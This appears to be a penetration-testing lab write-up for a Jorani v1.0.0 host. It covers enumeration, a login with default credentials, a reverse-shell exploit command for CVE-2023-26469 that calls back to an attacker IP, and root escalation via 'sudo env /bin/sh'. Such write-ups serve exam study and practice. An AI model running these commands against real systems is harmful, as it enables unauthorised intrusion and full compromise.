# System Information
OS: Ubuntu Linux
IP: 192.168.206.109

---
# Service Enumeration

## 22/tcp SSH

OpenSSH 9.6p1 Ubuntu 3ubuntu13.5

guess:
- anonymous:anonymous
- jordak:jordak

## 80/tcp HTTP

Apache/2.4.58

robots.txt:
```
User-agent: *
Disallow: /
```

feroxbuster finds assets/, /.gitignore, and /.gitattributes

/.git redirects to /session/login, which seems to be running Jorani v1.0.0

![[Pasted image 20260828164540.png]]

Default creds (found on Google), bbalet:bbalet, allow us to log in.

Also, later found through feroxbuster that /sql/jorani.sql confirms this default account's username and password hash.

![[Pasted image 20260828165905.png]]


![[Pasted image 20260828164808.png]]

Find CVE-2018-15918, authenticated SQL injection, but the version is 0.6.5, so this instance won't be vulnerable.

CVE-2023-26469 applies to v1.0.0 and can lead to RCE.
https://nvd.nist.gov/vuln/detail/cve-2023-26469

# Initial Access

https://github.com/samipmainali/Jorani-Reverse-Shell-v1.0.0

`python3 Jorani_V1.0.0_exploit.py -u http://$IP -i 192.168.45.194 -p 443`

# Privilege Escalation

`sudo -l`:
```
(ALL : ALL) ALL
(ALL) NOPASSWD: /usr/bin/env
```

https://gtfobins.org/gtfobins/env/

`sudo env /bin/sh` gives a prompt as root.

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260828170810.png]]

